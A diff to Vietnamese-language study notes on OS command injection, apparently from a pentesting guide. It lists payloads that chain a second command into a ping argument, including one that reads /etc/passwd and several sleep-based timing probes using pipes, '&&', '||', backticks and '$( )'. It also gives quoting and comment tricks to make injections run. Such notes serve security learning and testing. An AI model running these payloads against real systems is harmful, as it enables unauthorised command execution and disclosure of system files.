@@ -22,5 +22,10 @@ description: "OS Command Injection"
   - Ví dụ:
     - ```ping 8.8.8.8 | cat /etc/passwd``` Nếu có thể chạy được -> Lỗi.
     - ```ping 8.8.8.8 | sleep 5``` Nếu chạy xong lệnh ping mà sever chờ 5s -> Lỗi.
-  - Hay bất cứ đâu có thể nhập một lệnh hệ thống - [Tham khảo](https://book.hacktricks.xyz/pentesting-web/command-injection)
+    - ```ping google.com && sleep 5```
+    - ```google.com || sleep 5```
+    - ```google.com; `sleep 5'```
+    - ```google.com=$(sleep 5)```
+    - Bypass 4 ký tự, 5 ký tự.
+  - Nhiều cách khác - [Tham khảo](https://book.hacktricks.xyz/pentesting-web/command-injection)
 - Chú ý là khi chèn lệnh cần đúng với cú pháp của câu lệnh lập trình viên viết và lệnh hệ thống để lệnh có thể chạy được, ví dụ thiếu dấu ```'``` thì phải thêm ```'```, thừa thì thêm dấu commment ```#```
